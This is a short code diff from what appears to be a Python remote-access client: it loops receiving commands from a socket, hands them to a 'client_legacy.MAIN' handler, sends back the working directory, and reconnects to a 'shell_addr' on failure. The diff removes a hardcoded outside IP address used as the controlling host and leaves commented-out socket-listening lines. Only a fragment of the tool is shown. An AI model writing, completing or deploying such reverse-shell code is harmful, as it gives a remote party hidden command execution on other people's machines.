@@ -22,7 +22,7 @@ print("imported")
 # s.bind(('', 9099))
 # s.listen(5)
 # client, addr = s.accept()
-ip = "38.180.96.248"
+ip = ""
 # print("Gotcha")
 # del s
 # time.sleep(10)
@@ -43,7 +43,7 @@ while True:
     com = s.recv(1024).decode('cp65001')
     try:
         client_legacy.MAIN(command=com, s=s, ip=ip)
-        s.send(subprocess.getoutput('cd').encode('cp65001'))
+        s.send(os.getcwd().encode('cp65001'))
     except:
         s.close()
         s = waiting(creds=shell_addr)
